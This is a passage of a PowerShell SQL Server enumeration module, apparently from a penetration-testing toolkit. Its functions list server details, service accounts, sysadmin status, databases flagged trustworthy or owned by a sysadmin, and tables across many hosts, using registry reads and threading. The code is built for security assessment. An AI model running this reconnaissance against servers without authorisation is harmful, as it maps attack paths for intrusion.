        $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append as needed
        $TblServerInfo = $TblServerInfo + $TblServerInfoTemp
    }

    End
    {
        # Return data
        $TblServerInfo
    }
}

Function  Get-SQLServerInfoThreaded
{
    <#
            .SYNOPSIS
            Returns basic server and user information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Instance
            Number of host threads.
            .EXAMPLE
            PS C:\> Get-SQLServerInfoThreaded -Instance SQLServer1\STANDARDDEV2014

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DomainName             : Domain
            ServiceName            : MSSQL$STANDARDDEV2014
            ServiceAccount         : LocalSystem
            AuthenticationMode     : Windows and SQL Server Authentication
            Clustered              : No
            SQLServerVersionNumber : 12.0.4213.0
            SQLServerMajorVersion  : 2014
            SQLServerEdition       : Developer Edition (64-bit)
            SQLServerServicePack   : SP1
            OSArchitecture         : X64
            OsMachineType          : WinNT
            OSVersionName          : Windows 8.1 Pro
            OsVersionNumber        : 6.3
            Currentlogin           : Domain\MyUser
            IsSysadmin             : Yes
            ActiveSessions         : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerInfoThreaded -Verbose -Threads 20
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblServerInfo = New-Object -TypeName System.Data.DataTable
        $null = $TblServerInfo.Columns.Add('ComputerName')
        $null = $TblServerInfo.Columns.Add('Instance')
        $null = $TblServerInfo.Columns.Add('DomainName')
        $null = $TblServerInfo.Columns.Add('ServiceName')
        $null = $TblServerInfo.Columns.Add('ServiceAccount')
        $null = $TblServerInfo.Columns.Add('AuthenticationMode')
        $null = $TblServerInfo.Columns.Add('Clustered')
        $null = $TblServerInfo.Columns.Add('SQLServerVersionNumber')
        $null = $TblServerInfo.Columns.Add('SQLServerMajorVersion')
        $null = $TblServerInfo.Columns.Add('SQLServerEdition')
        $null = $TblServerInfo.Columns.Add('SQLServerServicePack')
        $null = $TblServerInfo.Columns.Add('OSArchitecture')
        $null = $TblServerInfo.Columns.Add('OsMachineType')
        $null = $TblServerInfo.Columns.Add('OSVersionName')
        $null = $TblServerInfo.Columns.Add('OsVersionNumber')
        $null = $TblServerInfo.Columns.Add('Currentlogin')
        $null = $TblServerInfo.Columns.Add('IsSysadmin')
        $null = $TblServerInfo.Columns.Add('ActiveSessions')

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Test connection to instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Get number of active sessions for server
            $ActiveSessions = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
            Where-Object -FilterScript {
                $_.SessionStatus -eq 'running'
            } |
            Measure-Object -Line |
            Select-Object -Property Lines -ExpandProperty Lines

            # Get sysadmin status
            $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

            if($IsSysadmin -eq 'Yes')
            {
                # Grab additional information if sysadmin
                $SysadminSetup = "
                    -- Get machine type
                    DECLARE @MachineType  SYSNAME
                    EXECUTE master.dbo.xp_regread
                    @rootkey		= N'HKEY_LOCAL_MACHINE',
                    @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                    @value_name		= N'ProductType',
                    @value			= @MachineType output

                    -- Get OS version
                    DECLARE @ProductName  SYSNAME
                    EXECUTE master.dbo.xp_regread
                    @rootkey		= N'HKEY_LOCAL_MACHINE',
                    @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                    @value_name		= N'ProductName',
                @value			= @ProductName output"

                $SysadminQuery = '  @MachineType as [OsMachineType],
                @ProductName as [OSVersionName],'
            }
            else
            {
                $SysadminSetup = ''
                $SysadminQuery = ''
            }

            # Define Query
            $Query = "  -- Get SQL Server Information

                -- Get SQL Server Service Name and Path
                DECLARE @SQLServerInstance varchar(250)
                DECLARE @SQLServerServiceName varchar(250)
                if @@SERVICENAME = 'MSSQLSERVER'
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                set @SQLServerServiceName = 'MSSQLSERVER'
                END
                ELSE
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
                set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
                END

                -- Get SQL Server Service Account
                DECLARE @ServiceaccountName varchar(250)
                EXECUTE master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
                N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

                -- Get authentication mode
                DECLARE @AuthenticationMode INT
                EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
                N'Software\Microsoft\MSSQLServer\MSSQLServer',
                N'LoginMode', @AuthenticationMode OUTPUT

                -- Grab additional information as sysadmin
                $SysadminSetup

                -- Return server and version information
                SELECT  '$ComputerName' as [ComputerName],
                @@servername as [Instance],
                DEFAULT_DOMAIN() as [DomainName],
                @SQLServerServiceName as [ServiceName],
                @ServiceAccountName as [ServiceAccount],
                (SELECT CASE @AuthenticationMode
                WHEN 1 THEN 'Windows Authentication'
                WHEN 2 THEN 'Windows and SQL Server Authentication'
                ELSE 'Unknown'
                END) as [AuthenticationMode],
                CASE  SERVERPROPERTY('IsClustered')
                WHEN 0
                THEN 'No'
                ELSE 'Yes'
                END as [Clustered],
                SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
                SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
                serverproperty('Edition') as [SQLServerEdition],
                SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
                SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
                $SysadminQuery
                RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
                SYSTEM_USER as [Currentlogin],
                '$IsSysadmin' as [IsSysadmin],
            '$ActiveSessions' as [ActiveSessions]"
            # Execute Query
            $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append as needed
            $TblServerInfoTemp |
            ForEach-Object -Process {
                # Add row
                $null = $TblServerInfo.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DomainName,
                    $_.ServiceName,
                    $_.ServiceAccount,
                    $_.AuthenticationMode,
                    $_.Clustered,
                    $_.SQLServerVersionNumber,
                    $_.SQLServerMajorVersion,
                    $_.SQLServerEdition,
                    $_.SQLServerServicePack,
                    $_.OSArchitecture,
                    $_.OsMachineType,
                    $_.OSVersionName,
                    $_.OsVersionNumber,
                    $_.Currentlogin,
                    $_.IsSysadmin,
                    $_.ActiveSessions
                )
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblServerInfo
    }
}


Function  Get-SQLDatabase
{
    <#
            .SYNOPSIS
            Returns database information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER NoDefaults
            Only select non default databases.
            .PARAMETER HasAccess
            Only select databases the current user has access to.
            .PARAMETER SysAdminOnly
            Only select databases owned by a sysadmin.
            .EXAMPLE
            PS C:\> Get-SQLDatabase -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            DatabaseId          : 7
            DatabaseName        : testdb
            DatabaseOwner       : sa
            OwnerIsSysadmin     : 1
            is_trustworthy_on   : True
            is_db_chaining_on   : False
            is_broker_enabled   : True
            is_encrypted        : False
            is_read_only        : False
            create_date         : 4/13/2016 4:27:36 PM
            recovery_model_desc : FULL
            FileName            : C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\DATA\testdb.mdf
            DbSizeMb            : 3.19
            has_dbaccess        : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabase -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ComputerName')
        $null = $TblDatabases.Columns.Add('Instance')
        $null = $TblDatabases.Columns.Add('DatabaseId')
        $null = $TblDatabases.Columns.Add('DatabaseName')
        $null = $TblDatabases.Columns.Add('DatabaseOwner')
        $null = $TblDatabases.Columns.Add('OwnerIsSysadmin')
        $null = $TblDatabases.Columns.Add('is_trustworthy_on')
        $null = $TblDatabases.Columns.Add('is_db_chaining_on')
        $null = $TblDatabases.Columns.Add('is_broker_enabled')
        $null = $TblDatabases.Columns.Add('is_encrypted')
        $null = $TblDatabases.Columns.Add('is_read_only')
        $null = $TblDatabases.Columns.Add('create_date')
        $null = $TblDatabases.Columns.Add('recovery_model_desc')
        $null = $TblDatabases.Columns.Add('FileName')
        $null = $TblDatabases.Columns.Add('DbSizeMb')
        $null = $TblDatabases.Columns.Add('has_dbaccess')

        # Setup database filter
        if($DatabaseName)
        {
            $DatabaseFilter = " and a.name like '$DatabaseName'"
        }
        else
        {
            $DatabaseFilter = ''
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            $NoDefaultsFilter = " and a.name not in ('master','tempdb','msdb','model')"
        }
        else
        {
            $NoDefaultsFilter = ''
        }

        # Setup HasAccess filter
        if($HasAccess)
        {
            $HasAccessFilter = ' and HAS_DBACCESS(a.name)=1'
        }
        else
        {
            $HasAccessFilter = ''
        }

        # Setup owner is sysadmin filter
        if($SysAdminOnly)
        {
            $SysAdminOnlyFilter = " and IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid))=1"
        }
        else
        {
            $SysAdminOnlyFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Check version
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Base query
        $QueryStart = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            a.database_id as [DatabaseId],
            a.name as [DatabaseName],
            SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
            IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
            a.is_trustworthy_on,
        a.is_db_chaining_on,"

        # Version specific columns
        if([int]$SQLVersionShort -ge 10)
        {
            $QueryVerSpec = '
                a.is_broker_enabled,
                a.is_encrypted,
            a.is_read_only,'
        }

        # Query end
        $QueryEnd = '
            a.create_date,
            a.recovery_model_desc,
            b.filename as [FileName],
            (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
            from sys.master_files where name like a.name) as [DbSizeMb],
            HAS_DBACCESS(a.name) as [has_dbaccess]
            FROM [sys].[databases] a
        INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid WHERE 1=1'

        # User defined filters
        $Filters = "
            $DatabaseFilter
            $NoDefaultsFilter
            $HasAccessFilter
            $SysAdminOnlyFilter
        ORDER BY a.database_id"

        $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results for pipeline items
        $TblResults |
        ForEach-Object -Process {
            # Set version specific values
            if([int]$SQLVersionShort -ge 10)
            {
                $is_broker_enabled = $_.is_broker_enabled
                $is_encrypted = $_.is_encrypted
                $is_read_only = $_.is_read_only
            }
            else
            {
                $is_broker_enabled = 'NA'
                $is_encrypted = 'NA'
                $is_read_only = 'NA'
            }

            $null = $TblDatabases.Rows.Add(
                $_.ComputerName,
                $_.Instance,
                $_.DatabaseId,
                $_.DatabaseName,
                $_.DatabaseOwner,
                $_.OwnerIsSysadmin,
                $_.is_trustworthy_on,
                $_.is_db_chaining_on,
                $is_broker_enabled,
                $is_encrypted,
                $is_read_only,
                $_.create_date,
                $_.recovery_model_desc,
                $_.FileName,
                $_.DbSizeMb,
                $_.has_dbaccess
            )
        }

    }

    End
    {
        # Return data
        $TblDatabases
    }
}

Function  Get-SQLDatabaseThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ComputerName')
        $null = $TblDatabases.Columns.Add('Instance')
        $null = $TblDatabases.Columns.Add('DatabaseId')
        $null = $TblDatabases.Columns.Add('DatabaseName')
        $null = $TblDatabases.Columns.Add('DatabaseOwner')
        $null = $TblDatabases.Columns.Add('OwnerIsSysadmin')
        $null = $TblDatabases.Columns.Add('is_trustworthy_on')
        $null = $TblDatabases.Columns.Add('is_db_chaining_on')
        $null = $TblDatabases.Columns.Add('is_broker_enabled')
        $null = $TblDatabases.Columns.Add('is_encrypted')
        $null = $TblDatabases.Columns.Add('is_read_only')
        $null = $TblDatabases.Columns.Add('create_date')
        $null = $TblDatabases.Columns.Add('recovery_model_desc')
        $null = $TblDatabases.Columns.Add('FileName')
        $null = $TblDatabases.Columns.Add('DbSizeMb')
        $null = $TblDatabases.Columns.Add('has_dbaccess')

        # Setup database filter
        if($DatabaseName)
        {
            $DatabaseFilter = " and a.name like '$DatabaseName'"
        }
        else
        {
            $DatabaseFilter = ''
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            $NoDefaultsFilter = " and a.name not in ('master','tempdb','msdb','model')"
        }
        else
        {
            $NoDefaultsFilter = ''
        }

        # Setup HasAccess filter
        if($HasAccess)
        {
            $HasAccessFilter = ' and HAS_DBACCESS(a.name)=1'
        }
        else
        {
            $HasAccessFilter = ''
        }

        # Setup owner is sysadmin filter
        if($SysAdminOnly)
        {
            $SysAdminOnlyFilter = " and IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid))=1"
        }
        else
        {
            $SysAdminOnlyFilter = ''
        }

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable


        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            # Set instance
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Test connection to instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Check version
            $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
            if($SQLVersionFull)
            {
                $SQLVersionShort = $SQLVersionFull.Split('.')[0]
            }

            # Base query
            $QueryStart = "  SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                a.database_id as [DatabaseId],
                a.name as [DatabaseName],
                SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
                IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
                a.is_trustworthy_on,
            a.is_db_chaining_on,"

            # Version specific columns
            if([int]$SQLVersionShort -ge 10)
            {
                $QueryVerSpec = '
                    a.is_broker_enabled,
                    a.is_encrypted,
                a.is_read_only,'
            }

            # Query end
            $QueryEnd = '
                a.create_date,
                a.recovery_model_desc,
                b.filename as [FileName],
                (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
                from sys.master_files where name like a.name) as [DbSizeMb],
                HAS_DBACCESS(a.name) as [has_dbaccess]
                FROM [sys].[databases] a
            INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid WHERE 1=1'

            # User defined filters
            $Filters = "
                $DatabaseFilter
                $NoDefaultsFilter
                $HasAccessFilter
                $SysAdminOnlyFilter
            ORDER BY a.database_id"

            $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results for pipeline items
            $TblResults |
            ForEach-Object -Process {
                # Set version specific values
                if([int]$SQLVersionShort -ge 10)
                {
                    $is_broker_enabled = $_.is_broker_enabled
                    $is_encrypted = $_.is_encrypted
                    $is_read_only = $_.is_read_only
                }
                else
                {
                    $is_broker_enabled = 'NA'
                    $is_encrypted = 'NA'
                    $is_read_only = 'NA'
                }

                $null = $TblDatabases.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DatabaseId,
                    $_.DatabaseName,
                    $_.DatabaseOwner,
                    $_.OwnerIsSysadmin,
                    $_.is_trustworthy_on,
                    $_.is_db_chaining_on,
                    $is_broker_enabled,
                    $is_encrypted,
                    $is_read_only,
                    $_.create_date,
                    $_.recovery_model_desc,
                    $_.FileName,
                    $_.DbSizeMb,
                    $_.has_dbaccess
                )
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblDatabases
    }
}

Function  Get-SQLTable
{
    <#
            .SYNOPSIS
            Returns table information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER TableName
            Table name to filter for.
            .PARAMETER NoDefaults
            Filter out results from default databases.
            .EXAMPLE
            PS C:\> Get-SQLTable -Instance SQLServer1\STANDARDDEV2014 -NoDefaults  -DatabaseName testdb

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            DatabaseName : testdb
            SchemaName   : dbo
            TableName    : NOCList
            TableType    : BASE TABLE

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            DatabaseName : testdb
            SchemaName   : dbo
            TableName    : tracking
            TableType    : BASE TABLE
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLTable -Verbose -NoDefaults
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        $TblTables = New-Object -TypeName System.Data.DataTable

        # Setup table filter
        if($TableName)
        {
            $TableFilter = " where table_name like '%$TableName%'"
        }
        else
        {
            $TableFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing tables from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                TABLE_TYPE as [TableType]
                FROM [$DbName].[INFORMATION_SCHEMA].[TABLES]
                $TableFilter
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblTables = $TblTables + $TblResults
        }
    }

    End
    {
        # Return data
        $TblTables
    }
}

Function  Get-SQLColumn
{
    <#
            .SYNOPSIS
            Returns column information from target SQL Servers. Supports keyword search.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name filter.
            .PARAMETER TableName
            Table name filter.
            .PARAMETER ColumnName
            Column name filter.
            .PARAMETER ColumnNameSearch
            Column name filter that support wildcards.
            .PARAMETER NoDefaults
            Don't list anything from default databases.
            .EXAMPLE
            PS C:\> Get-SQLColumn -Verbose -Instance "SQLServer1"
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLColumn -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
